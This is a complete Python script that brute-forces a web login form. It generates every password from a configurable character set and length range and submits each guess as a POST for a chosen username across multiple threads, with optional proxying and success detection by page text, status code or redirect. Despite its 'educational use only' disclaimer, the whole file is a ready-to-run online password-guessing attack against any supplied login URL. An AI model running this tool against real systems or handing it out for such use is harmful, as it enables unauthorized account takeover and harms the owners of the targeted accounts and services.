#!/usr/bin/env python3
"""
Auto Brute‑Force with Character Set (a-z, 0-9)
Generates combinations on the fly – no wordlist needed.
For educational use only on systems you own/have permission.
"""

import requests
import argparse
import sys
import threading
import time
import itertools
import string
from queue import Queue

# ------------------- Parse Arguments -------------------
parser = argparse.ArgumentParser(description="Auto Brute‑Force with Character Set")
parser.add_argument("-u", "--url", required=True, help="Target login URL")
parser.add_argument("--user", required=True, help="Username to attack")
parser.add_argument("--user-field", default="username", help="Username field name")
parser.add_argument("--pass-field", default="password", help="Password field name")
parser.add_argument("--charset", default=string.ascii_lowercase + string.digits,
                    help="Character set to use (default: a-z0-9)")
parser.add_argument("--min-len", type=int, default=1, help="Minimum password length")
parser.add_argument("--max-len", type=int, default=4, help="Maximum password length")
parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between attempts (seconds)")
parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
parser.add_argument("--detect", choices=["text", "status", "redirect"], default="text",
                    help="Success detection method")
parser.add_argument("--success-text", default="Welcome", help="Text indicating success")
parser.add_argument("--success-status", type=int, default=302, help="Success status code")
parser.add_argument("--success-redirect", default="/dashboard", help="Redirect fragment")
parser.add_argument("-o", "--output", help="File to save found password")
parser.add_argument("--verbose", action="store_true", help="Print each attempt")
args = parser.parse_args()

# ------------------- Setup -------------------
session = requests.Session()
if args.proxy:
    session.proxies = {"http": args.proxy, "https": args.proxy}

found = False
found_password = None
lock = threading.Lock()

# Queue for password combinations (lazy generator)
def generate_passwords():
    for length in range(args.min_len, args.max_len + 1):
        for combo in itertools.product(args.charset, repeat=length):
            yield "".join(combo)

# Fill queue with generator (non‑blocking)
work_queue = Queue()
generator = generate_passwords()

def fill_queue():
    """Continuously fill the queue until found or exhausted."""
    for pwd in generator:
        with lock:
            if found:
                break
            work_queue.put(pwd)
    # Signal end when done
    work_queue.put(None)

# Start a background thread to fill the queue
filler = threading.Thread(target=fill_queue, daemon=True)
filler.start()

# ------------------- Detection -------------------
def is_success(response, final_url):
    if args.detect == "text":
        return args.success_text in response.text
    elif args.detect == "status":
        return response.status_code == args.success_status
    elif args.detect == "redirect":
        return args.success_redirect in final_url
    return False

# ------------------- Worker -------------------
def worker():
    global found, found_password
    while not found:
        try:
            pwd = work_queue.get(timeout=1)
        except:
            continue
        if pwd is None:
            break   # generator exhausted

        if args.verbose:
            print(f"[*] Trying: {pwd}")

        data = {args.user_field: args.user, args.pass_field: pwd}
        try:
            resp = session.post(args.url, data=data, timeout=args.timeout, allow_redirects=True)
        except Exception as e:
            if args.verbose:
                print(f"  Error: {e}")
            work_queue.task_done()
            continue

        if is_success(resp, resp.url):
            with lock:
                if not found:
                    found = True
                    found_password = pwd
                    print(f"\n[+] SUCCESS! Password: {pwd}")
                    if args.output:
                        with open(args.output, "w") as f:
                            f.write(pwd)
            break

        if args.delay > 0:
            time.sleep(args.delay)

        work_queue.task_done()

# ------------------- Run -------------------
print(f"[*] Starting attack with charset '{args.charset}', length {args.min_len}-{args.max_len}")
threads = []
for _ in range(args.threads):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

if not found:
    print("[!] No password found in the given range.")
